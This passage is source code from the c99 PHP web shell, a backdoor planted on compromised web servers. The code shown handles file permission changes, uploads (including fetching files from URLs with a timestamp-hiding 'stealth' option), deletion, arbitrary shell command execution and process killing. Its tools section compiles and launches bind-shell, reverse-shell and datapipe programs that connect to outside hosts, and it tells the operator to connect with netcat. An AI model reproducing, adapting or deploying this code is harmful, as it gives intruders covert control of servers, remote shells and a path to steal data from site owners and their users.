   $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);
   if (chmod($d.$f,$octet)) {$act = "ls"; $form = FALSE; $err = "";}
   else {$err = "Can't chmod to ".$octet.".";}
  }
  if ($form)
  {
   $perms = parse_perms($mode);
   echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".($err?"<b>Error:</b> ".$err:"")."<form action=\"".$surl."\" method=POST><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";
  }
 }
}
if ($act == "upload")
{
 $uploadmess = "";
 $uploadpath = str_replace("\\",DIRECTORY_SEPARATOR,$uploadpath);
 if (empty($uploadpath)) {$uploadpath = $d;}
 elseif (substr($uploadpath,-1) != "/") {$uploadpath .= "/";}
 if (!empty($submit))
 {
  global $HTTP_POST_FILES;
  $uploadfile = $HTTP_POST_FILES["uploadfile"];
  if (!empty($uploadfile["tmp_name"]))
  {
   if (empty($uploadfilename)) {$destin = $uploadfile["name"];}
   else {$destin = $userfilename;}
   if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {$uploadmess .= "Error uploading file ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!<br>";}
  }
  elseif (!empty($uploadurl))
  {
   if (!empty($uploadfilename)) {$destin = $uploadfilename;}
   else
   {
    $destin = explode("/",$destin);
    $destin = $destin[count($destin)-1];
    if (empty($destin))
    {
     $i = 0;
     $b = "";
     while(file_exists($uploadpath.$destin)) {if ($i > 0) {$b = "_".$i;} $destin = "index".$b.".html"; $i++;}}
   }
   if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "<b>Incorect url!</b><br>";}
   else
   {
    $st = getmicrotime();
    $content = @file_get_contents($uploadurl);
    $dt = round(getmicrotime()-$st,4);
    if (!$content) {$uploadmess .=  "Can't download file!<br>";}
    else
    {
     if ($filestealth) {$stat = stat($uploadpath.$destin);}
     $fp = fopen($uploadpath.$destin,"w");
     if (!$fp) {$uploadmess .= "Error writing to file ".htmlspecialchars($destin)."!<br>";}
     else
     {
      fwrite($fp,$content,strlen($content));
      fclose($fp);
      if ($filestealth) {touch($uploadpath.$destin,$stat[9],$stat[8]);}
     }
    }
   }
  }
 }
 if ($miniform)
 {
  echo "<b>".$uploadmess."</b>";
  $act = "ls";
 }
 else
 {
  echo "<b>File upload:</b><br><b>".$uploadmess."</b><form enctype=\"multipart/form-data\" method=POST><input type=\"hidden\" name=\"act\" value=\"upload\"><input type=\"hidden\" name=\"d\" value=\"".urlencode($d)."\">
Select file on your local computer: <input name=\"uploadfile\" type=\"file\"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or<br>
Input URL: <input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"><br><br>
Save this file dir: <input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"><br><br>
File-name (auto-fill): <input name=uploadfilename size=25><br><br>
<input type=checkbox name=uploadautoname value=1 id=df4>&nbsp;convert file name to lovercase<br><br>
<input type=submit name=submit value=\"Upload\">
</form>";
 }
}
if ($act == "delete")
{
 $delerr = "";
 foreach ($actbox as $v)
 {
  $result = FALSE;
  $result = fs_rmobj($v);
  if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."<br>";}
 }
 if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;}
 $act = "ls";
}
if (!$usefsbuff)
{
 if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "<center><b>Sorry, buffer is disabled. For enable, set directive \"\$useFSbuff\" as TRUE.</center>";}
}
else
{
 if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); c99_sess_put($sess_data); $act = "ls"; }
 elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); c99_sess_put($sess_data); $act = "ls";}
 elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} c99_sess_put($sess_data); $act = "ls";}
 if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); c99_sess_put($sess_data);}
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
   if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
  $act = "ls";
 }
 elseif ($actarcbuff)
 {
  $arcerr = "";
  if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
  else {$ext = ".tar.gz";}
  if ($ext == ".tar.gz") {$cmdline = "tar cfzv";}
  $cmdline .= " ".$actarcbuff_path;
  $objects = array_merge($sess_data["copy"],$sess_data["cut"]);
  foreach($objects as $v)
  {
   $v = str_replace("\\",DIRECTORY_SEPARATOR,$v);
   if (substr($v,0,strlen($d)) == $d) {$v = basename($v);}
   if (is_dir($v))
   {
    if (substr($v,-1) != DIRECTORY_SEPARATOR) {$v .= DIRECTORY_SEPARATOR;}
    $v .= "*";
   }
   $cmdline .= " ".$v;
  }
  $tmp = realpath(".");
  chdir($d);
  $ret = myshellexec($cmdline);
  chdir($tmp);
  if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!<br>";}
  $ret = str_replace("\r\n","\n",$ret);
  $ret = explode("\n",$ret);
  if ($copy_unset) {foreach($sess_data["copy"] as $k=>$v) {unset($sess_data["copy"][$k]);}}
  foreach($sess_data["cut"] as $k=>$v)
  {
   if (in_array($v,$ret)) {fs_rmobj($v);}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($arcerr)) {echo "<b>Archivation errors:</b><br>".$arcerr;}
  $act = "ls";
 }
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
   if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
  $act = "ls";
 }
}
if ($act == "cmd")
{
if (trim($cmd) == "ps -aux") {$act = "processes";}
elseif (trim($cmd) == "tasklist") {$act = "processes";}
else
{
 @chdir($chdir);
 if (!empty($submit))
 {
  echo "<b>Result of execution this command</b>:<br>";
  $olddir = realpath(".");
  @chdir($d);
  $ret = myshellexec($cmd);
  $ret = convert_cyr_string($ret,"d","w");
  if ($cmd_txt)
  {
   $rows = count(explode("\r\n",$ret))+1;
   if ($rows < 10) {$rows = 10;}
   echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
  }
  else {echo $ret."<br>";}
  @chdir($olddir);
 }
 else {echo "<b>Execution command</b>"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}
 echo "<form method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>".htmlspecialchars($cmd)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit name=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "></form>";
}
}
if ($act == "ls")
{
 if (count($ls_arr) > 0) {$list = $ls_arr;}
 else
 {
  $list = array();
  if ($h = @opendir($d))
  {
   while (($o = readdir($h)) !== FALSE) {$list[] = $d.$o;}
   closedir($h);
  }
  else {}
 }
 if (count($list) == 0) {echo "<center><b>Can't open folder (".htmlspecialchars($d).")!</b></center>";}
 else
 {
  //Building array
  $objects = array();
  $vd = "f"; //Viewing mode
  if ($vd == "f")
  {
   $objects["head"] = array();
   $objects["folders"] = array();
   $objects["links"] = array();
   $objects["files"] = array();
   foreach ($list as $v)
   {
    $o = basename($v);
    $row = array();
    if ($o == ".") {$row[] = $d.$o; $row[] = "LINK";}
    elseif ($o == "..") {$row[] = $d.$o; $row[] = "LINK";}
    elseif (is_dir($v))
    {
     if (is_link($v)) {$type = "LINK";}
     else {$type = "DIR";}
     $row[] = $v;
     $row[] = $type;
    }
    elseif(is_file($v)) {$row[] = $v; $row[] = filesize($v);}
    $row[] = filemtime($v);
    if (!$win)
    {
     //$ow = posix_getpwuid(fileowner($v));
     //$gr = posix_getgrgid(filegroup($v));
     $row[] = ($ow["name"]?$ow["name"]:fileowner($v))."/".($gr["name"]?$gr["name"]:filegroup($v));
    }
    $row[] = fileperms($v);
    if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}
    elseif (is_link($v)) {$objects["links"][] = $row;}
    elseif (is_dir($v)) {$objects["folders"][] = $row;}
    elseif (is_file($v)) {$objects["files"][] = $row;}
    $i++;
   }
   $row = array();
   $row[] = "<b>Name</b>";
   $row[] = "<b>Size</b>";
   $row[] = "<b>Modify</b>";
   if (!$win)
  {$row[] = "<b>Owner/Group</b>";}
   $row[] = "<b>Perms</b>";
   $row[] = "<b>Action</b>";
   $parsesort = parsesort($sort);
   $sort = $parsesort[0].$parsesort[1];
   $k = $parsesort[0];
   if ($parsesort[1] != "a") {$parsesort[1] = "d";}
   $y = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.sort.value='".$k.($parsesort[1] == "a"?"d":"a").";document.todo.submit();\">";
   $row[$k] .= $y;
   for($i=0;$i<count($row)-1;$i++)
   {
    if ($i != $k) {$row[$i] = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.sort.value='".$i.$parsesort[1]."';document.todo.submit();\">".$row[$i]."</a>";}
   }
   $v = $parsesort[0];
   usort($objects["folders"], "tabsort");
   usort($objects["links"], "tabsort");
   usort($objects["files"], "tabsort");
   if ($parsesort[1] == "d")
   {
    $objects["folders"] = array_reverse($objects["folders"]);
    $objects["files"] = array_reverse($objects["files"]);
   }
   $objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]);
   $tab = array();
   $tab["cols"] = array($row);
   $tab["head"] = array();
   $tab["folders"] = array();
   $tab["links"] = array();
   $tab["files"] = array();
   $i = 0;
   foreach ($objects as $a)
   {
    $v = $a[0];
    $o = basename($v);
    $dir = dirname($v);
    if ($disp_fullpath) {$disppath = $v;}
    else {$disppath = $o;}
    $disppath = str2mini($disppath,60);
    if (in_array($v,$sess_data["cut"])) {$disppath = "<strike>".$disppath."</strike>";}
    elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";}
    foreach ($regxp_highlight as $r)
    {
     if (ereg($r[0],$o))
     {
      if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; c99shexit();}
      else
      {
       $r[1] = round($r[1]);
       $isdir = is_dir($v);
       if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir))
       {
        if (empty($r[2])) {$r[2] = "<b>"; $r[3] = "</b>";}
        $disppath = $r[2].$disppath.$r[3];
        if ($r[4]) {break;}
       }
      }
     }
    }
    $uo = urlencode($o);
    $ud = urlencode($dir);
    $uv = urlencode($v);
    $row = array();
    if ($o == ".")
    {
     $row[] = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode(realpath($d.$o))."';document.todo.sort.value='".$sort."';document.todo.submit();\">".$o."</a>";
     $row[] = "LINK";
    }
    elseif ($o == "..")
    {
     $row[] = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode(realpath($d.$o))."';document.todo.sort.value='".$sort."';document.todo.submit();\">".$o."</a>";
     $row[] = "LINK";
    }
    elseif (is_dir($v))
    {
     if (is_link($v))
     {
      $disppath .= " => ".readlink($v);
      $type = "LINK";
      $row[] =  "&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".$uv."';document.todo.sort.value='".$sort."';document.todo.submit();\">[".$disppath."]</a>";         }
     else
     {
      $type = "DIR";
      $row[] =  "&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".$uv."';document.todo.sort.value='".$sort."';document.todo.submit();\">[".$disppath."]</a>";
     }
     $row[] = $type;
    }
    elseif(is_file($v))
    {
     $ext = explode(".",$o);
     $c = count($ext)-1;
     $ext = $ext[$c];
     $ext = strtolower($ext);
     $row[] =  "&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.d.value='".$ud."';document.todo.f.value='".$uo."';document.todo.submit();\">".$disppath."</a>";
     $row[] = view_size($a[1]);
    }
    $row[] = date("d.m.Y H:i:s",$a[2]);
    if (!$win) {$row[] = $a[3];}
     $row[] =  "&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='chmod';document.todo.d.value='".$ud."';document.todo.f.value='".$uo."';document.todo.submit();\"><b>".view_perms_color($v)."</b></a>";
    if ($o == ".") {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\">"; $i--;}
    else {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\">";}
    if (is_dir($v)){$row[] = "<a href=\"#\" onclick=\"document.todo.act.value='d';document.todo.d.value='".$uv."';document.todo.submit();\">I</a>&nbsp;".$checkbox;}
    else {$row[] = "<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".$uo."';document.todo.ft.value='info';document.todo.d.value='".$ud."';document.todo.submit();\">I</a>&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".$uo."';document.todo.ft.value='edit';document.todo.d.value='".$ud."';document.todo.submit();\">E</a>&nbsp;<a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".$uo."';document.todo.ft.value='download';document.todo.d.value='".$ud."';document.todo.submit();\">D</a>&nbsp;".$checkbox;}
    if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}
    elseif (is_link($v)) {$tab["links"][] = $row;}
    elseif (is_dir($v)) {$tab["folders"][] = $row;}
    elseif (is_file($v)) {$tab["files"][] = $row;}
    $i++;
   }
  }
  //Compiling table
  $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);
  echo "<center><b>Listing folder (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0><form method=POST name=\"ls_form\"><input type=hidden name=act value=".$dspact."><input type=hidden name=d value=".$d.">";
  foreach($table as $row)
  {
   echo "<tr>\r\n";
   foreach($row as $v) {echo "<td>".$v."</td>\r\n";}
   echo "</tr>\r\n";
  }
  echo "</table><hr size=\"1\" noshade><p align=\"right\">
  <script>
  function ls_setcheckboxall(status)
  {
   var id = 0;
   var num = ".(count($table)-2).";
   while (id <= num)
   {
    document.getElementById('actbox'+id).checked = status;
    id++;
   }
  }
  function ls_reverse_all()
  {
   var id = 0;
   var num = ".(count($table)-2).";
   while (id <= num)
   {
    document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked;
    id++;
   }
  }
  </script>
  <input type=\"button\" onclick=\"ls_setcheckboxall(1);\" value=\"Select all\">&nbsp;&nbsp;<input type=\"button\" onclick=\"ls_setcheckboxall(0);\" value=\"Unselect all\"><b>";
  if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0 and ($usefsbuff))
  {
   echo "<input type=submit name=actarcbuff value=\"Pack buffer to archive\">&nbsp;<input type=\"text\" name=\"actarcbuff_path\" value=\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actpastebuff\" value=\"Paste\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actemptybuff\" value=\"Empty buffer\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
  }
  echo "<select name=act><option value=\"".$act."\">With selected:</option>";
  echo "<option value=delete".($dspact == "delete"?" selected":"").">Delete</option>";
  echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Change-mode</option>";
  if ($usefsbuff)
  {
   echo "<option value=cut".($dspact == "cut"?" selected":"").">Cut</option>";
   echo "<option value=copy".($dspact == "copy"?" selected":"").">Copy</option>";
   echo "<option value=unselect".($dspact == "unselect"?" selected":"").">Unselect</option>";
  }
  echo "</select>&nbsp;<input type=submit value=\"Confirm\"></p>";
  echo "</form>";
 }
}
if ($act == "tools")
{
 $bndportsrcs = array(
  "c99sh_bindport.pl"=>array("Using PERL","perl %path %port"),
  "c99sh_bindport.c"=>array("Using C","%path %port %pass")
 );
 $bcsrcs = array(
  "c99sh_backconn.pl"=>array("Using PERL","perl %path %host %port"),
  "c99sh_backconn.c"=>array("Using C","%path %host %port")
 );
 $dpsrcs = array(
  "c99sh_datapipe.pl"=>array("Using PERL","perl %path %localport %remotehost %remoteport"),
  "c99sh_datapipe.c"=>array("Using C","%path %localport %remoteport %remotehost")
 );
 if (!is_array($bind)) {$bind = array();}
 if (!is_array($bc)) {$bc = array();}
 if (!is_array($datapipe)) {$datapipe = array();}

 if (!is_numeric($bind["port"])) {$bind["port"] = $bindport_port;}
 if (empty($bind["pass"])) {$bind["pass"] = $bindport_pass;}

 if (empty($bc["host"])) {$bc["host"] = getenv("REMOTE_ADDR");}
 if (!is_numeric($bc["port"])) {$bc["port"] = $bc_port;}

 if (empty($datapipe["remoteaddr"])) {$datapipe["remoteaddr"] = "irc.dalnet.ru:6667";}
 if (!is_numeric($datapipe["localport"])) {$datapipe["localport"] = $datapipe_localport;}
 if (!empty($bindsubmit))
 {
  echo "<b>Result of binding port:</b><br>";
  $v = $bndportsrcs[$bind["src"]];
  if (empty($v)) {echo "Unknown file!<br>";}
  elseif (fsockopen(getenv("SERVER_ADDR"),$bind["port"],$errno,$errstr,0.1)) {echo "Port alredy in use, select any other!<br>";}
  else
  {
   $w = explode(".",$bind["src"]);
   $ext = $w[count($w)-1];
   unset($w[count($w)-1]);
   $srcpath = join(".",$w).".".rand(0,999).".".$ext;
   $binpath = $tmpdir.join(".",$w).rand(0,999);
   if ($ext == "pl") {$binpath = $srcpath;}
   @unlink($srcpath);
   $fp = fopen($srcpath,"ab+");
   if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
   elseif (!$data = c99getsource($bind["src"])) {echo "Can't download sources!";}
   else
   {
    fwrite($fp,$data,strlen($data));
    fclose($fp);
    if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath);  @unlink($srcpath);}
    $v[1] = str_replace("%path",$binpath,$v[1]);
    $v[1] = str_replace("%port",$bind["port"],$v[1]);
    $v[1] = str_replace("%pass",$bind["pass"],$v[1]);
    $v[1] = str_replace("//","/",$v[1]);
    $retbind = myshellexec($v[1]." > /dev/null &");
    sleep(5);
    $sock = fsockopen("localhost",$bind["port"],$errno,$errstr,5);
    if (!$sock) {echo "I can't connect to localhost:".$bind["port"]."! I think you should configure your firewall.";}
    else {echo "Binding... ok! Connect to <b>".getenv("SERVER_ADDR").":".$bind["port"]."</b>! You should use NetCat&copy;, run \"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center><a href=\"#\" onclick=\"document.todo.act.value='processes';document.todo.grep.value='".basename($binpath)."';document.todo.submit();\"><u>View binder's process</u></a></center>";}
   }
   echo "<br>";
  }
 }
 if (!empty($bcsubmit))
 {
  echo "<b>Result of back connection:</b><br>";
  $v = $bcsrcs[$bc["src"]];
  if (empty($v)) {echo "Unknown file!<br>";}
  else
  {
   $w = explode(".",$bc["src"]);
   $ext = $w[count($w)-1];
   unset($w[count($w)-1]);
   $srcpath = join(".",$w).".".rand(0,999).".".$ext;
   $binpath = $tmpdir.join(".",$w).rand(0,999);
   if ($ext == "pl") {$binpath = $srcpath;}
   @unlink($srcpath);
   $fp = fopen($srcpath,"ab+");
   if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
   elseif (!$data = c99getsource($bc["src"])) {echo "Can't download sources!";}
   else
   {
    fwrite($fp,$data,strlen($data));
    fclose($fp);
    if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath); @unlink($srcpath);}
    $v[1] = str_replace("%path",$binpath,$v[1]);
    $v[1] = str_replace("%host",$bc["host"],$v[1]);
    $v[1] = str_replace("%port",$bc["port"],$v[1]);
    $v[1] = str_replace("//","/",$v[1]);
    $retbind = myshellexec($v[1]." > /dev/null &");
    echo "Now script try connect to ".htmlspecialchars($bc["host"]).":".htmlspecialchars($bc["port"])."...<br>";
   }
  }
 }
 if (!empty($dpsubmit))
 {
  echo "<b>Result of datapipe-running:</b><br>";
  $v = $dpsrcs[$datapipe["src"]];
  if (empty($v)) {echo "Unknown file!<br>";}
  elseif (fsockopen(getenv("SERVER_ADDR"),$datapipe["port"],$errno,$errstr,0.1)) {echo "Port alredy in use, select any other!<br>";}
  else
  {
   $srcpath = $tmpdir.$datapipe["src"];
   $w = explode(".",$datapipe["src"]);
   $ext = $w[count($w)-1];
   unset($w[count($w)-1]);
   $srcpath = join(".",$w).".".rand(0,999).".".$ext;
   $binpath = $tmpdir.join(".",$w).rand(0,999);
   if ($ext == "pl") {$binpath = $srcpath;}
   @unlink($srcpath);
   $fp = fopen($srcpath,"ab+");
   if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
   elseif (!$data = c99getsource($datapipe["src"])) {echo "Can't download sources!";}
   else
   {
    fwrite($fp,$data,strlen($data));
    fclose($fp);
    if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath); @unlink($srcpath);}
    list($datapipe["remotehost"],$datapipe["remoteport"]) = explode(":",$datapipe["remoteaddr"]);
    $v[1] = str_replace("%path",$binpath,$v[1]);
    $v[1] = str_replace("%localport",$datapipe["localport"],$v[1]);
    $v[1] = str_replace("%remotehost",$datapipe["remotehost"],$v[1]);
    $v[1] = str_replace("%remoteport",$datapipe["remoteport"],$v[1]);
    $v[1] = str_replace("//","/",$v[1]);
    $retbind = myshellexec($v[1]." > /dev/null &");
    sleep(5);
    $sock = fsockopen("localhost",$datapipe["port"],$errno,$errstr,5);
    if (!$sock) {echo "I can't connect to localhost:".$datapipe["localport"]."! I think you should configure your firewall.";}
    else {echo "Running datapipe... ok! Connect to <b>".getenv("SERVER_ADDR").":".$datapipe["port"].", and you will connected to ".$datapipe["remoteaddr"]."</b>! You should use NetCat&copy;, run \"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center><a href=\"#\" onclick=\"document.todo.act.value='processes';document.todo.grep.value='".basename($binpath)."';document.todo.submit();\"><u>View datapipe process</u></a></center>";}
   }
   echo "<br>";
  }
 }
 ?><?php echo $d; ?><?php echo htmlspecialchars($bind["port"]); ?><?php echo htmlspecialchars($bind["pass"]); ?><?php
 foreach($bndportsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bind["src"]) {echo " selected";} echo ">".$v[0]."</option>";}
 ?><?php echo $d; ?><?php echo htmlspecialchars($bc["host"]); ?><?php echo htmlspecialchars($bc["port"]); ?><?php
foreach($bcsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bc["src"]) {echo " selected";} echo ">".$v[0]."</option>";}
?><?php echo $bc_port; ?><?php echo $d; ?><?php echo htmlspecialchars($datapipe["remoteaddr"]); ?><?php echo htmlspecialchars($datapipe["localport"]); ?><?php
foreach($dpsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bc["src"]) {echo " selected";} echo ">".$v[0]."</option>";}
?><?php
}
if ($act == "processes")
{
 echo "<b>Processes:</b><br>";
 if (!$win) {$handler = "ps -aux".($grep?" | grep '".addslashes($grep)."'":"");}
 else {$handler = "tasklist";}
 $ret = myshellexec($handler);
 if (!$ret) {echo "Can't execute \"".$handler."\"!";}
 else
 {
  if (empty($processes_sort)) {$processes_sort = $sort_default;}
  $parsesort = parsesort($processes_sort);
  if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;}
  $k = $parsesort[0];
  if ($parsesort[1] != "a") {$y = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.processes_sort.value='".$k."a\"';document.todo.submit();\">!</a>";}
  else {$y = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.processes_sort.value='".$k."d\"';document.todo.submit();\">!</a>";}
  $ret = htmlspecialchars($ret);
  if (!$win)
  {
   if ($pid)
   {
    if (is_null($sig)) {$sig = 9;}
    echo "Sending signal ".$sig." to #".$pid."... ";
    if (posix_kill($pid,$sig)) {echo "OK.";}
    else {echo "ERROR.";}
   }
   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
   $stack = explode("\n",$ret);
   $head = explode(" ",$stack[0]);
   unset($stack[0]);
   for($i=0;$i<count($head);$i++)
   {
    if ($i != $k) {$head[$i] = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.processes_sort.value='".$i.$parsesort[1]."';document.todo.submit();\"><b>".$head[$i]."</b></a>";}
   }
   $prcs = array();
   foreach ($stack as $line)
   {
    if (!empty($line))
        {
         echo "<tr>";
     $line = explode(" ",$line);
     $line[10] = join(" ",array_slice($line,10));
     $line = array_slice($line,0,11);
     if ($line[0] == get_current_user()) {$line[0] = "<font color=green>".$line[0]."</font>";}
     $line[] = "<a href=\"#\" onclick=\"document.todo.act.value='processes';document.todo.d.value='".urlencode($d)."';document.todo.pid.value='".$line[1]."';document.todo.sig.value='9';document.todo.submit();\"><u>KILL</u></a>";
     $prcs[] = $line;
     echo "</tr>";
    }
   }
  }
  else
  {
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("                ",$ret)) {$ret = str_replace("                ","        ",$ret);}
   while (ereg("         ",$ret)) {$ret = str_replace("         ","        ",$ret);}
   $ret = convert_cyr_string($ret,"d","w");
   $stack = explode("\n",$ret);
   unset($stack[0],$stack[2]);
   $stack = array_values($stack);
   $head = explode("        ",$stack[0]);
   $head[1] = explode(" ",$head[1]);
   $head[1] = $head[1][0];
   $stack = array_slice($stack,1);
   unset($head[2]);
   $head = array_values($head);

